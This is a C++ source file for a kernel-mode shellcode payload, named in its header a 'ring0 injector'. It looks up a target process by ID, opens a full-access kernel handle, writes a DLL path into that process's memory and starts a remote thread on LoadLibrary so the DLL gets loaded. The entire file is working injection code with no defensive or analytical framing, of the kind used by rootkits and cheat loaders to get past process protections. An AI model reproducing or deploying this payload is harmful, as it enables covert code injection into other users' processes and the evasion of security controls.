// shellcode.cpp — ring0 injector payload v2 (handle-based, no process attach).
// Compiled into section .sc and extracted as raw bytes.
#pragma code_seg(".sc")

typedef unsigned long long u64;
typedef unsigned int u32;
typedef unsigned char u8;
typedef unsigned short u16;

struct Ctx {
    u64 orig_dispatch;   // +0
    u64 fn_lookup;       // +8
    u64 fn_open;         // +16  ObOpenObjectByPointer
    u64 fn_alloc;        // +24  ZwAllocateVirtualMemory
    u64 fn_thread;       // +32  RtlCreateUserThread
    u64 fn_close;        // +40  ZwClose
    u64 fn_deref;        // +48  ObfDereferenceObject
    u64 pid;             // +56
    u64 loadlibrary;     // +64
    u64 path_len;        // +72
    u64 status;          // +80
    u64 ps_process_type; // +88
    u16 path[128];       // +96
};

__declspec(noinline) extern "C" void sc_main(Ctx* c) {
    typedef long (*FnLookup)(u64, void**);
    typedef long (*FnOpen)(void*, u32, void*, u32, void*, u32, void**);
    typedef long (*FnAlloc)(void*, void**, u64, u64*, u32, u32);
    typedef long (*FnThread)(void*, void*, u8, u32, u64, u64, void*, void*, void**, void*);
    typedef long (*FnClose)(void*);
    typedef void (*FnDeref)(void*);

    void* process = 0;
    long st = reinterpret_cast<FnLookup>(c->fn_lookup)(c->pid, &process);
    if (st < 0 || !process) {
        c->status = static_cast<u64>(st);
        return;
    }

    void* ph = 0;
    st = reinterpret_cast<FnOpen>(c->fn_open)(
        process, 0x200 /*OBJ_KERNEL_HANDLE*/, 0, 0x1FFFFF /*PROCESS_ALL_ACCESS*/,
        reinterpret_cast<void*>(c->ps_process_type), 0 /*KernelMode*/, &ph);
    if (st < 0 || !ph) {
        c->status = static_cast<u64>(st);
        reinterpret_cast<FnDeref>(c->fn_deref)(process);
        return;
    }

    void* base = 0;
    u64 size = c->path_len * 2;
    long a = reinterpret_cast<FnAlloc>(c->fn_alloc)(ph, &base, 0, &size, 0x3000, 0x04);
    if (a >= 0 && base) {
        u16* dst = static_cast<u16*>(base);
        for (u64 i = 0; i < c->path_len; ++i)
            dst[i] = c->path[i];

        void* thread = 0;
        long t = reinterpret_cast<FnThread>(c->fn_thread)(
            ph, 0, 0, 0, 0, 0,
            reinterpret_cast<void*>(c->loadlibrary), base, &thread, 0);
        c->status = static_cast<u64>(t);
    } else {
        c->status = static_cast<u64>(a);
    }

    reinterpret_cast<FnClose>(c->fn_close)(ph);
    reinterpret_cast<FnDeref>(c->fn_deref)(process);
}
